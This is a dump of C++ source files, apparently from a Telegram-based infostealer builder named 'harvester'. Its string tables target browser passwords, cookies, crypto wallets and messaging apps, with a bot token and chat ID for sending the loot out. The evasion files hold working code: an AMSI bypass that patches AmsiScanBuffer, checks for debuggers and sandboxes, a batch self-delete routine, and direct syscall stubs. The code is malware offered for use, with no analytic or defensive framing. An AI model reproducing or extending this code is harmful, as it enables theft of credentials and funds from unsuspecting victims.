+        return DecryptString(cipher, iv, key);
+    }
+    case STR_KEY4_DB: {
+        std::vector<unsigned char> cipher(OBF_STR_31, OBF_STR_31 + OBF_STR_31_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_LOGINS_JSON: {
+        std::vector<unsigned char> cipher(OBF_STR_32, OBF_STR_32 + OBF_STR_32_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_COOKIES_SQLITE: {
+        std::vector<unsigned char> cipher(OBF_STR_33, OBF_STR_33 + OBF_STR_33_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CANNOT_OPEN_FILE: {
+        std::vector<unsigned char> cipher(OBF_STR_34, OBF_STR_34 + OBF_STR_34_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CANNOT_READ_FILE: {
+        std::vector<unsigned char> cipher(OBF_STR_35, OBF_STR_35 + OBF_STR_35_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_ATTEMPT: {
+        std::vector<unsigned char> cipher(OBF_STR_36, OBF_STR_36 + OBF_STR_36_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_FAILED_RESPONSE: {
+        std::vector<unsigned char> cipher(OBF_STR_37, OBF_STR_37 + OBF_STR_37_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_SEND_SUCCESS: {
+        std::vector<unsigned char> cipher(OBF_STR_38, OBF_STR_38 + OBF_STR_38_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_SEND_FAILED: {
+        std::vector<unsigned char> cipher(OBF_STR_39, OBF_STR_39 + OBF_STR_39_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_POWERSHELL_COMPRESS: {
+        std::vector<unsigned char> cipher(OBF_STR_40, OBF_STR_40 + OBF_STR_40_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_VMTOOLSD: {
+        std::vector<unsigned char> cipher(OBF_STR_41, OBF_STR_41 + OBF_STR_41_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_PROCMON: {
+        std::vector<unsigned char> cipher(OBF_STR_42, OBF_STR_42 + OBF_STR_42_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_PROCEXP: {
+        std::vector<unsigned char> cipher(OBF_STR_43, OBF_STR_43 + OBF_STR_43_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_WIRESHARK: {
+        std::vector<unsigned char> cipher(OBF_STR_44, OBF_STR_44 + OBF_STR_44_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_X64DBG: {
+        std::vector<unsigned char> cipher(OBF_STR_45, OBF_STR_45 + OBF_STR_45_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_OLLYDBG: {
+        std::vector<unsigned char> cipher(OBF_STR_46, OBF_STR_46 + OBF_STR_46_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_IDA: {
+        std::vector<unsigned char> cipher(OBF_STR_47, OBF_STR_47 + OBF_STR_47_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_WINDBG: {
+        std::vector<unsigned char> cipher(OBF_STR_48, OBF_STR_48 + OBF_STR_48_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_VBOXSERVICE: {
+        std::vector<unsigned char> cipher(OBF_STR_49, OBF_STR_49 + OBF_STR_49_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_SANDBOX: {
+        std::vector<unsigned char> cipher(OBF_STR_50, OBF_STR_50 + OBF_STR_50_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_MALWARE: {
+        std::vector<unsigned char> cipher(OBF_STR_51, OBF_STR_51 + OBF_STR_51_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_ANALYSIS: {
+        std::vector<unsigned char> cipher(OBF_STR_52, OBF_STR_52 + OBF_STR_52_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_VIRUS: {
+        std::vector<unsigned char> cipher(OBF_STR_53, OBF_STR_53 + OBF_STR_53_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_TEST: {
+        std::vector<unsigned char> cipher(OBF_STR_54, OBF_STR_54 + OBF_STR_54_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_USER: {
+        std::vector<unsigned char> cipher(OBF_STR_55, OBF_STR_55 + OBF_STR_55_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_VIRTUAL: {
+        std::vector<unsigned char> cipher(OBF_STR_56, OBF_STR_56 + OBF_STR_56_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_KEY_DATAS: {
+        std::vector<unsigned char> cipher(OBF_STR_57, OBF_STR_57 + OBF_STR_57_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_MAP_PREFIX: {
+        std::vector<unsigned char> cipher(OBF_STR_58, OBF_STR_58 + OBF_STR_58_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BAT_ECHO_OFF: {
+        std::vector<unsigned char> cipher(OBF_STR_59, OBF_STR_59 + OBF_STR_59_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BAT_LOOP: {
+        std::vector<unsigned char> cipher(OBF_STR_60, OBF_STR_60 + OBF_STR_60_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BAT_DEL: {
+        std::vector<unsigned char> cipher(OBF_STR_61, OBF_STR_61 + OBF_STR_61_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BAT_IF_EXIST: {
+        std::vector<unsigned char> cipher(OBF_STR_62, OBF_STR_62 + OBF_STR_62_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BAT_GOTO_LOOP: {
+        std::vector<unsigned char> cipher(OBF_STR_63, OBF_STR_63 + OBF_STR_63_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BAT_DEL_SELF: {
+        std::vector<unsigned char> cipher(OBF_STR_64, OBF_STR_64 + OBF_STR_64_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_USER_AGENT: {
+        std::vector<unsigned char> cipher(OBF_STR_65, OBF_STR_65 + OBF_STR_65_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_MULTIPART_BOUNDARY: {
+        std::vector<unsigned char> cipher(OBF_STR_66, OBF_STR_66 + OBF_STR_66_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CONTENT_DISPOSITION_CHAT: {
+        std::vector<unsigned char> cipher(OBF_STR_67, OBF_STR_67 + OBF_STR_67_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CONTENT_DISPOSITION_DOC: {
+        std::vector<unsigned char> cipher(OBF_STR_68, OBF_STR_68 + OBF_STR_68_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CONTENT_TYPE_ZIP: {
+        std::vector<unsigned char> cipher(OBF_STR_69, OBF_STR_69 + OBF_STR_69_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_WILDCARD_DEST: {
+        std::vector<unsigned char> cipher(OBF_STR_70, OBF_STR_70 + OBF_STR_70_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BOT_TOKEN: {
+        std::vector<unsigned char> cipher(OBF_STR_71, OBF_STR_71 + OBF_STR_71_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CHAT_ID: {
+        std::vector<unsigned char> cipher(OBF_STR_72, OBF_STR_72 + OBF_STR_72_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    default:
+        return "";
+    }
+}
+
+================================================================================
+FILE: harvester\crypto\obfuscation.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\crypto\obfuscation.h
+================================================================================
+// harvester/crypto/obfuscation.h
+// إصدار موسع – يشمل جميع السلاسل اللازمة للميزات الجديدة
+#pragma once
+
+#include <string>
+#include <vector>
+
+std::string DecryptString(const std::vector<unsigned char>& cipher,
+                          const std::vector<unsigned char>& iv,
+                          const std::vector<unsigned char>& key);
+
+std::string GetObfuscatedString(int id);
+
+// -------------------------------------------------------------------
+// قائمة بكل السلاسل النصية الحساسة (حتى المعرف 150)
+// -------------------------------------------------------------------
+enum ObfuscatedStringID {
+    // === السلاسل السابقة (1-72) ===
+    STR_TDATA = 1,
+    STR_TELEGRAM_DESKTOP = 2,
+    STR_API_TELEGRAM = 3,
+    STR_BOT_TOKEN_PLACE = 4,
+    STR_SEND_DOCUMENT = 5,
+    STR_CHROME = 6,
+    STR_EDGE = 7,
+    STR_BRAVE = 8,
+    STR_OPERA = 9,
+    STR_VIVALDI = 10,
+    STR_SAFARI = 11,
+    STR_TOR_BROWSER = 12,
+    STR_CHROMIUM = 13,
+    STR_EPIC = 14,
+    STR_OPERA_GX = 15,
+    STR_CHROME_DATA = 16,
+    STR_EDGE_DATA = 17,
+    STR_BRAVE_DATA = 18,
+    STR_OPERA_DATA = 19,
+    STR_VIVALDI_DATA = 20,
+    STR_SAFARI_DATA = 21,
+    STR_TOR_DATA = 22,
+    STR_CHROMIUM_DATA = 23,
+    STR_EPIC_DATA = 24,
+    STR_OPERA_GX_DATA = 25,
+    STR_LOCAL_STATE = 26,
+    STR_LOGIN_DATA = 27,
+    STR_COOKIES = 28,
+    STR_WEB_DATA = 29,
+    STR_FIREFOX_PROFILES = 30,
+    STR_KEY4_DB = 31,
+    STR_LOGINS_JSON = 32,
+    STR_COOKIES_SQLITE = 33,
+    STR_CANNOT_OPEN_FILE = 34,
+    STR_CANNOT_READ_FILE = 35,
+    STR_ATTEMPT = 36,
+    STR_FAILED_RESPONSE = 37,
+    STR_SEND_SUCCESS = 38,
+    STR_SEND_FAILED = 39,
+    STR_POWERSHELL_COMPRESS = 40,
+    STR_VMTOOLSD = 41,
+    STR_PROCMON = 42,
+    STR_PROCEXP = 43,
+    STR_WIRESHARK = 44,
+    STR_X64DBG = 45,
+    STR_OLLYDBG = 46,
+    STR_IDA = 47,
+    STR_WINDBG = 48,
+    STR_VBOXSERVICE = 49,
+    STR_SANDBOX = 50,
+    STR_MALWARE = 51,
+    STR_ANALYSIS = 52,
+    STR_VIRUS = 53,
+    STR_TEST = 54,
+    STR_USER = 55,
+    STR_VIRTUAL = 56,
+    STR_KEY_DATAS = 57,
+    STR_MAP_PREFIX = 58,
+    STR_BAT_ECHO_OFF = 59,
+    STR_BAT_LOOP = 60,
+    STR_BAT_DEL = 61,
+    STR_BAT_IF_EXIST = 62,
+    STR_BAT_GOTO_LOOP = 63,
+    STR_BAT_DEL_SELF = 64,
+    STR_USER_AGENT = 65,
+    STR_MULTIPART_BOUNDARY = 66,
+    STR_CONTENT_DISPOSITION_CHAT = 67,
+    STR_CONTENT_DISPOSITION_DOC = 68,
+    STR_CONTENT_TYPE_ZIP = 69,
+    STR_WILDCARD_DEST = 70,
+    STR_BOT_TOKEN = 71,
+    STR_CHAT_ID = 72,
+    
+    // === سلاسل جديدة للميزات الإضافية (73-150) ===
+    
+    // خدمات IP العام
+    STR_IP_API_URL = 73,          // "https://api.ipify.org"
+    STR_IP_API2_URL = 74,         // "https://icanhazip.com"
+    
+    // معلومات النظام – حقول التقرير
+    STR_SYSTEM_INFO = 75,
+    STR_IP_ADDRESS = 76,
+    STR_COMPUTER_NAME = 77,
+    STR_USER_NAME = 78,
+    STR_OS_VERSION = 79,
+    STR_ARCHITECTURE = 80,
+    STR_RAM = 81,
+    STR_CPU = 82,
+    STR_GPU = 83,
+    STR_LANGUAGE = 84,
+    STR_TIMEZONE = 85,
+    STR_INSTALLED_SOFTWARE = 86,
+    
+    // البرامج المستهدفة – أسماء
+    STR_DISCORD = 87,
+    STR_VIBER = 88,
+    STR_TLAUNCHER = 89,
+    STR_STEAM = 90,
+    STR_BLUESTACKS = 91,
+    STR_WALLETS = 92,
+    STR_EXODUS = 93,
+    STR_ATOMIC = 94,
+    STR_ELECTRUM = 95,
+    STR_GUARDA = 96,
+    STR_COINOMI = 97,
+    STR_METAMASK = 98,
+    STR_COINBASE_WALLET = 99,
+    STR_BINANCE_WALLET = 100,
+    STR_PHANTOM = 101,
+    STR_RONIN = 102,
+    STR_TRONLINK = 103,
+    STR_TRUST_WALLET = 104,
+    STR_OPENVPN = 105,
+    STR_NORDVPN = 106,
+    STR_PROTONVPN = 107,
+    
+    // مسارات الريجستري للبرامج المثبتة
+    STR_REG_UNINSTALL = 108,      // "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
+    STR_REG_UNINSTALL_WOW64 = 109, // "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
+    
+    // مجلدات التثبيت الشائعة
+    STR_PROGRAM_FILES = 110,
+    STR_PROGRAM_FILES_X86 = 111,
+    STR_APPDATA = 112,
+    STR_LOCAL_APPDATA = 113,
+    
+    // أسماء الملفات والمجلدات الجديدة للتقرير
+    STR_REPORT_HTML = 114,        // "report.html"
+    STR_SYSTEM_TXT = 115,         // "system_info.txt"
+    STR_PASSWORDS_DIR = 116,      // "Passwords"
+    STR_COOKIES_DIR = 117,        // "Cookies"
+    STR_HISTORY_DIR = 118,        // "History"
+    STR_BOOKMARKS_DIR = 119,      // "Bookmarks"
+    STR_AUTOFILLS_DIR = 120,      // "AutoFills"
+    STR_WALLETS_DIR = 121,        // "Wallets"
+    STR_SESSIONS_DIR = 122,       // "Sessions"
+    STR_DETECTED_APPS = 123,      // "detected_apps.txt"
+    
+    // حقول التقرير النصية
+    STR_PC_USER_INFORMATION = 124, // "PC USER INFORMATION"
+    STR_BASIC_INFORMATION = 125,   // "BASIC INFORMATION"
+    STR_GRABBED_SOFTWARE = 126,    // "GRABBED SOFTWARE"
+    STR_DOMAINS_DETECTED = 127,    // "DOMAINS DETECTED"
+    STR_PASSWORDS_COUNT = 128,     // "Passwords - "
+    STR_COOKIES_COUNT = 129,       // "Cookies - "
+    STR_HISTORY_COUNT = 130,       // "History - "
+    STR_AUTOFILLS_COUNT = 131,     // "AutoFills - "
+    STR_CC_COUNT = 132,            // "CC - "
+    STR_GRABBED_FILES_COUNT = 133, // "Grabbed Files - "
+    STR_GITHUB_DOMAIN = 134,       // "github.com"
+    
+    // أسماء الملفات الداخلية للتقرير
+    STR_PASSWORDS_TXT = 135,       // "passwords.txt" (كلمات مرور مفكوكة)
+    STR_COOKIES_TXT = 136,         // "cookies_export.txt"
+    STR_HISTORY_CSV = 137,         // "history.csv"
+    STR_BOOKMARKS_JSON = 138,      // "bookmarks.json"
+    STR_AUTOFILLS_CSV = 139,       // "autofills.csv"
+    
+    // كل ما تبقى (مكان للمستقبل)
+    STR_LAST_DUMMY = 150
+};
+
+================================================================================
+FILE: harvester\evasion\amsi_bypass.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\amsi_bypass.cpp
+================================================================================
+// amsi_bypass.cpp
+#include "amsi_bypass.h"
+#include <cstring>       // for memcpy
+#include <memoryapi.h>   // for VirtualProtect
+
+const BYTE patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+const SIZE_T patchSize = sizeof(patchBytes);
+
+bool BypassAMSI() {
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (!hAmsi) {
+        hAmsi = LoadLibraryA("amsi.dll");
+        if (!hAmsi) return false;
+    }
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) return false;
+    
+    LPVOID pTarget = (LPVOID)pAmsiScanBuffer;   // التحويل الصريح
+    
+    DWORD oldProtect = 0;
+    if (!VirtualProtect(pTarget, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect))
+        return false;
+    
+    memcpy(pTarget, patchBytes, patchSize);
+    VirtualProtect(pTarget, patchSize, oldProtect, &oldProtect);
+    return true;
+}
+
+bool RestoreAMSI() {
+    // في هذا الإصدار المبسط لا نحتاج للاستعادة
+    return false;
+}
+
+================================================================================
+FILE: harvester\evasion\amsi_bypass.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\amsi_bypass.h
+================================================================================
+// amsi_bypass.h
+#pragma once
+#include <windows.h>
+
+// يعطل AMSI في العملية الحالية عن طريق تصحيح AmsiScanBuffer
+bool BypassAMSI();
+
+// استعادة AMSI (اختياري)
+bool RestoreAMSI();
+
+================================================================================
+FILE: harvester\evasion\anti_debug.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\anti_debug.cpp
+================================================================================
+// harvester/evasion/anti_debug.cpp – إصدار معتمد على GetObfuscatedString
+#include "anti_debug.h"
+#include "../crypto/obfuscation.h"
+#include <windows.h>
+#include <intrin.h>
+#include <psapi.h>
+#include <string>
+#include <cstring>
+
+#pragma comment(lib, "psapi.lib")
+
+// تعريف PEB يدوياً (لأن MinGW قد لا يعرفه)
+typedef struct _PEB {
+    BYTE Reserved1[2];
+    BYTE BeingDebugged;
+    BYTE Reserved2[1];
+    BYTE Reserved3[2];
+    PVOID Reserved4[1];
+    PVOID ImageBaseAddress;
+    PVOID Reserved5[1];
+} PEB, *PPEB;
+
+static bool CheckPEBBeingDebugged() {
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    if (peb && peb->BeingDebugged)
+        return true;
+    if (peb && (*(DWORD*)((BYTE*)peb + 0xBC) & 0x70) != 0)
+        return true;
+    return false;
+}
+
+static bool CheckTiming() {
+    __int64 t1 = __rdtsc();
+    __int64 t2 = __rdtsc();
+    return (t2 - t1) > 10000;
+}
+
+static bool CheckSuspiciousProcesses() {
+    DWORD pids[1024], bytesReturned;
+    if (!EnumProcesses(pids, sizeof(pids), &bytesReturned))
+        return false;
+    DWORD numPids = bytesReturned / sizeof(DWORD);
+    
+    // قائمة أسماء العمليات المشبوهة (تُجلب مشفرة)
+    int suspiciousIDs[] = {
+        STR_VMTOOLSD, STR_PROCMON, STR_PROCEXP, STR_WIRESHARK,
+        STR_X64DBG, STR_OLLYDBG, STR_IDA, STR_WINDBG, STR_VBOXSERVICE
+    };
+    
+    for (DWORD i = 0; i < numPids; i++) {
+        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
+        if (h) {
+            char name[MAX_PATH];
+            if (GetModuleBaseNameA(h, NULL, name, sizeof(name))) {
+                for (int sid : suspiciousIDs) {
+                    std::string suspect = GetObfuscatedString(sid);
+                    if (_stricmp(name, suspect.c_str()) == 0) {
+                        CloseHandle(h);
+                        return true;
+                    }
+                }
+            }
+            CloseHandle(h);
+        }
+    }
+    return false;
+}
+
+static bool CheckSandboxNames() {
+    char user[256];
+    DWORD len = 256;
+    GetUserNameA(user, &len);
+    int sandboxUserIDs[] = {STR_SANDBOX, STR_MALWARE, STR_VIRUS, STR_TEST, STR_USER};
+    for (int sid : sandboxUserIDs) {
+        std::string bad = GetObfuscatedString(sid);
+        if (strstr(user, bad.c_str())) return true;
+    }
+    
+    char host[MAX_COMPUTERNAME_LENGTH + 1];
+    len = sizeof(host);
+    GetComputerNameA(host, &len);
+    int sandboxHostIDs[] = {STR_SANDBOX, STR_MALWARE, STR_ANALYSIS, STR_VIRTUAL};
+    for (int sid : sandboxHostIDs) {
+        std::string bad = GetObfuscatedString(sid);
+        if (strstr(host, bad.c_str())) return true;
+    }
+    return false;
+}
+
+static bool CheckLowMemory() {
+    MEMORYSTATUSEX mem;
+    mem.dwLength = sizeof(mem);
+    GlobalMemoryStatusEx(&mem);
+    return mem.ullTotalPhys < 2ull * 1024 * 1024 * 1024;
+}
+
+bool IsDebuggerPresentAdvanced() {
+    if (IsDebuggerPresent()) return true;
+    if (CheckPEBBeingDebugged()) return true;
+    if (CheckTiming()) return true;
+    return false;
+}
+
+bool IsSandboxEnvironment() {
+    if (CheckSuspiciousProcesses()) return true;
+    if (CheckSandboxNames()) return true;
+    if (CheckLowMemory()) return true;
+    return false;
+}
+
+void AntiDebugLoop() {
+    if (IsDebuggerPresentAdvanced() || IsSandboxEnvironment()) {
+        Sleep(1800000);  // 30 دقيقة
+        exit(0);
+    }
+}
+
+// دوال وهمية للتضليل (لا تحتوي على نصوص حساسة)
+void DummyAntiDebugFunction1() {
+    volatile int x = 0;
+    for (int i = 0; i < 1000; i++) x += i;
+}
+
+void DummyAntiDebugFunction2() {
+    volatile char buf[512];
+    for (int i = 0; i < 512; i++) buf[i] = (char)(i * 3);
+}
+
+void DummyAntiDebugFunction3() {
+    volatile DWORD dummy = GetTickCount();
+    dummy ^= 0xDEADBEEF;
+}
+
+void __attribute__((noinline)) SleepForever() {
+    Sleep(0xFFFFFFFF);
+}
+
+void __attribute__((noinline)) CrashProcess() {
+    int* p = nullptr;
+    *p = 0;
+}
+
+================================================================================
+FILE: harvester\evasion\anti_debug.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\anti_debug.h
+================================================================================
+// harvester/evasion/anti_debug.h
+// إصدار قوي جداً – كشف التصحيح والبيئات الافتراضية
+#pragma once
+
+#include <windows.h>
+
+// -------------------------------------------------------------------
+// دوال الكشف الرئيسية
+// -------------------------------------------------------------------
+
+// كشف وجود مصحح (متقدم)
+bool IsDebuggerPresentAdvanced();
+
+// كشف بيئة افتراضية أو ساندبوكس (مثل VirusTotal)
+bool IsSandboxEnvironment();
+
+// إذا تم اكتشاف أي من البيئات الخطرة، يتم إما إنهاء البرنامج أو النوم لوقت طويل
+// يفضل استدعاؤها في بداية WinMain مباشرة
+void AntiDebugLoop();
+
+// -------------------------------------------------------------------
+// دوال وهمية لإضافة ضجيج في الملف الثنائي (تضليل المحلل)
+// -------------------------------------------------------------------
+void DummyAntiDebugFunction1();
+void DummyAntiDebugFunction2();
+void DummyAntiDebugFunction3();
+
+// -------------------------------------------------------------------
+// دوال مساعدة (مخفية) – لا تنوي استخدامها مباشرة
+// -------------------------------------------------------------------
+void __attribute__((noinline)) SleepForever();
+void __attribute__((noinline)) CrashProcess();
+
+================================================================================
+FILE: harvester\evasion\self_delete.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\self_delete.cpp
+================================================================================
+// harvester/evasion/self_delete.cpp
+// إصدار قوي – حذف الملف الذاتي بعد التنفيذ
+#include "self_delete.h"
+#include <windows.h>
+#include <string>
+
+void SelfDelete() {
+    // الحصول على المسار الكامل للملف الحالي
+    char modulePath[MAX_PATH];
+    GetModuleFileNameA(NULL, modulePath, MAX_PATH);
+    
+    // إنشاء ملف بات مؤقت في نفس المجلد
+    std::string batPath = std::string(modulePath) + ".bat";
+    
+    // محتوى ملف البات: حلقة تكرارية تحذف الملف المستهدف، ثم تحذف نفسها
+    std::string content = 
+        "@echo off\n"
+        ":loop\n"
+        "del \"" + std::string(modulePath) + "\" /f /q\n"
+        "if exist \"" + std::string(modulePath) + "\" goto loop\n"
+        "del \"" + batPath + "\" /f /q\n";
+    
+    // كتابة ملف البات
+    HANDLE hFile = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    
+    DWORD written;
+    WriteFile(hFile, content.c_str(), content.size(), &written, NULL);
+    CloseHandle(hFile);
+    
+    // تشغيل ملف البات مخفياً
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    
+    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL,
+                   FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    
+    // إنهاء العملية الحالية (سيتم حذف الملف فوراً بواسطة البات)
+    ExitProcess(0);
+}
+
+// دوال وهمية للتضليل
+void DummySelfDeleteFunction1() {
+    volatile int x = 0;
+    for (int i = 0; i < 100; i++) x += i;
+}
+
+void DummySelfDeleteFunction2() {
+    volatile char c = 0;
+    for (int i = 0; i < 256; i++) c ^= (char)i;
+}
+
+================================================================================
+FILE: harvester\evasion\self_delete.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\self_delete.h
+================================================================================
+// harvester/evasion/self_delete.h
+#pragma once
+
+void SelfDelete();
+void DummySelfDeleteFunction1();
+void DummySelfDeleteFunction2();
+
+================================================================================
+FILE: harvester\evasion\syscall_injection.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\syscall_injection.cpp
+================================================================================
+// harvester/evasion/syscall_injection.cpp
+// إصدار قوي – استدعاءات نظام غير مباشرة لـ x64 (MinGW/GCC)
+#include "syscall_injection.h"
+#include <windows.h>
+#include <winternl.h>
+#include <vector>
+#include <cstdint>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
+
+// --------------------------------------------------------------
+// بنية لتخزين رقم السيسكول وعنوانه (احتياطي)
+// --------------------------------------------------------------
+typedef struct _SYSCALL_ENTRY {
+    DWORD number;
+    FARPROC address;
+} SYSCALL_ENTRY;
+
+static SYSCALL_ENTRY syscalls[2];
+static bool syscallsInitialized = false;
+
+// --------------------------------------------------------------
+// استخراج رقم السيسكول من ntdll.dll (البحث عن mov eax, imm32)
+// --------------------------------------------------------------
+DWORD GetSyscallNumber(const char* functionName) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return 0;
+    
+    BYTE* func = (BYTE*)GetProcAddress(ntdll, functionName);
+    if (!func) return 0;
+    
+    // البحث عن أول تعليمة mov eax, imm32 (B8 xx xx xx xx)
+    for (int i = 0; i < 32; i++) {
+        if (func[i] == 0xB8) {
+            return *(DWORD*)(func + i + 1);
+        }
+    }
+    return 0;
+}
+
+// --------------------------------------------------------------
+// تهيئة جدول السيسكولات المطلوبة
+// --------------------------------------------------------------
+void InitSyscalls() {
+    if (syscallsInitialized) return;
+    
+    syscalls[0].number = GetSyscallNumber("NtAllocateVirtualMemory");
+    syscalls[1].number = GetSyscallNumber("NtProtectVirtualMemory");
+    
+    syscallsInitialized = true;
+}
+
+// --------------------------------------------------------------
+// تنفيذ سيسكول غير مباشر مع 6 معاملات
+// باستخدام inline assembly بصيغة AT&T (مناسبة لـ MinGW)
+// --------------------------------------------------------------
+__attribute__((naked))
+static NTSTATUS SyscallExecute(DWORD number, uintptr_t a1, uintptr_t a2, uintptr_t a3,
+                               uintptr_t a4, uintptr_t a5, uintptr_t a6) {
+    __asm__ volatile (
+        "mov %eax, %ecx\n\t"   // syscall number -> eax
+        "mov %rdx, %r10\n\t"   // second argument -> r10 (as required by syscall)
+        "syscall\n\t"
+        "ret\n\t"
+    );
+}
+
+// --------------------------------------------------------------
+// تخصيص ذاكرة باستخدام NtAllocateVirtualMemory عبر سيسكول
+// --------------------------------------------------------------
+NTSTATUS SyscallAllocateMemory(HANDLE hProcess, PVOID* baseAddr, SIZE_T regionSize,
+                               DWORD allocationType, DWORD protect) {
+    InitSyscalls();
+    if (syscalls[0].number == 0) return STATUS_UNSUCCESSFUL;
+    
+    SIZE_T size = regionSize;
+    return SyscallExecute(syscalls[0].number,
+                          (uintptr_t)hProcess,
+                          (uintptr_t)baseAddr,
+                          0,                     // ZeroBits
+                          (uintptr_t)&size,
+                          allocationType,
+                          protect);
+}
+
+// --------------------------------------------------------------
+// تغيير حماية الذاكرة باستخدام NtProtectVirtualMemory عبر سيسكول
+// --------------------------------------------------------------
+NTSTATUS SyscallProtectMemory(HANDLE hProcess, PVOID* baseAddr, PSIZE_T regionSize,
+                              DWORD newProtect, PDWORD oldProtect) {
+    InitSyscalls();
+    if (syscalls[1].number == 0) return STATUS_UNSUCCESSFUL;
+    
+    return SyscallExecute(syscalls[1].number,
+                          (uintptr_t)hProcess,
+                          (uintptr_t)baseAddr,
+                          (uintptr_t)regionSize,
+                          newProtect,
+                          (uintptr_t)oldProtect,
+                          0);
+}
+
+// --------------------------------------------------------------
+// دوال وهمية لإضافة ضجيج
+// --------------------------------------------------------------
+void DummySyscallFunction1() {
+    volatile DWORD x = 0;
+    for (int i = 0; i < 100; i++) x += i;
+}
+
+void DummySyscallFunction2() {
+    volatile BYTE buf[64];
+    for (int i = 0; i < 64; i++) buf[i] = (BYTE)(i ^ 0xAA);
+}
+
+================================================================================
+FILE: harvester\evasion\syscall_injection.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\evasion\syscall_injection.h
+================================================================================
+// harvester/evasion/syscall_injection.h
+// إصدار قوي – استدعاءات نظام غير مباشرة لتجاوز الخطافات
+#pragma once
+
+#include <windows.h>
+#include <winternl.h>
+
+// -------------------------------------------------------------------
+// استخراج رقم استدعاء النظام لوظيفة معينة من ntdll.dll
+// -------------------------------------------------------------------
+DWORD GetSyscallNumber(const char* functionName);
+
+// -------------------------------------------------------------------
+// تنفيذ استدعاء نظام مع عدد متغير من المعاملات (حتى 6)
+// ملاحظة: هذه الدالة مكتوبة بـ inline assembly ولا يمكن استدعاؤها مباشرة من C++
+// بل نستخدم الدوال المساعدة أدناه.
+// -------------------------------------------------------------------
+NTSTATUS SyscallInvoke(DWORD number, ...);
+
+// -------------------------------------------------------------------
